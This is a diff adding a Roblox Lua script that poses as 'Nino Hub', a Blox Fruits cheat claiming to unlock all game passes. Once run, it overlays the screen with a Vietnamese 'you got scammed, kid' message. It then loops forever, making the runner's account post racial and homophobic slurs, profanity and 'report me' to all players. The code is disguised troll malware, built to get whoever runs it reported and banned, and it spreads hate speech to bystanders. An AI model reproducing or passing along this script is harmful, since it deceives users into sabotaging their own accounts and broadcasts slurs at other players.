@@ -1,0 +1,88 @@
+xwd = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+Gamename = xwd.Name
+local games = {
+[game.PlaceId] = {
+    Title = "Blox Fruits",
+    Icons = "",
+    Welcome = function()
+            return tostring(
+            " "
+                ..
+
+                        Gamename.. "!" .. " Nino Hub]"  .."\n Loadded Successfully Nino unlock all game pass"
+            )
+    end
+}
+}
+if games[game.PlaceId] then	
+if games[game.PlaceId].Title == "Blox Fruits" then
+    local function notify(types, ...)
+            if types == "Notify" then
+            require(game.ReplicatedStorage.Notification).new(...):Display()
+            end
+    end
+    notify("Notify", games[game.PlaceId].Welcome())
+end
+end
+
+
+
+local cac = Instance.new('ScreenGui')
+cac.Parent = game.CoreGui
+
+local lon = Instance.new('TextLabel')
+lon.Parent = cac
+lon.BackgroundTransparency = 1
+lon.TextSize = 50
+lon.Text = 'may bi scam roi nhoc'
+lon.TextColor3 = Color3.fromRGB(255,255,255)
+lon.Size = UDim2.new(1,0,1,0)
+repeat wait(1) until game:IsLoaded()
+
+
+wait(1.1)
+
+game.StarterGui:SetCore("SendNotification", {
+    Icon = "";
+    Title = "Nino Hub", 
+    Text = "Check Join discord"
+})
+
+wait(2.4)
+
+game.StarterGui:SetCore("SendNotification", {
+    Icon = "";
+    Title = "Nino Hub", 
+    Text = "Welcome Nino Hub :)"
+})
+
+local cac = Instance.new('ScreenGui')
+cac.Parent = game.CoreGui
+
+local lon = Instance.new('TextLabel')
+lon.Parent = cac
+lon.BackgroundTransparency = 1
+lon.TextSize = 50
+lon.Text = 'may bi scam roi nhoc'
+lon.TextColor3 = Color3.fromRGB(255,255,255)
+lon.Size = UDim2.new(1,0,1,0)
+repeat wait(1) until game:IsLoaded()
+
+
+
+local args2 = {
+    [1] = "dit me tui may game n hu cac du ma tui may",
+    [2] = "All"
+}
+local args = {
+
+    [1] = "report me kid gay nigga lgbt",
+
+    [2] = "All"
+}
+while wait() do
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait(.1)
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args2))
+wait(1)
+end
